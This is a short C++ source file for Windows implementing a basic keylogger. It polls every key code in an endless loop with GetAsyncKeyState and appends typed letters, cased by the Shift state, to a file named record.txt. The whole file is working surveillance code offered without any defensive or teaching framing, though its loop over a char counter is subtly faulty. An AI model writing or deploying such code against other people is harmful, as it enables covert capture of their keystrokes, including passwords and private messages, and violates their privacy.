#include <iostream>
#include <windows.h> 
#include <Winuser.h> 
#include <fstream>    
using namespace std;

void keylog(){
	char key;
	while(true){
		for(key=0 ;key<=255; key++){
			if (GetAsyncKeyState(key) == -32767){
				ofstream write ("record.txt", ios::app);

				//Upper case
				//shift(0x10), cap lock(0x14)
				if(((key>64) && (key<91)) && (GetAsyncKeyState(0x10))){
					write << key;
					write.close();
					break;
				}
				// Lower Case
				else if (((key>64) && (key<91)) && !(GetAsyncKeyState(0x10))){
					key +=32;
					write << key;           
					write.close();
					break;
				}				
			}
		}
	}
}

int main()
{
	keylog();
	return 0;
}
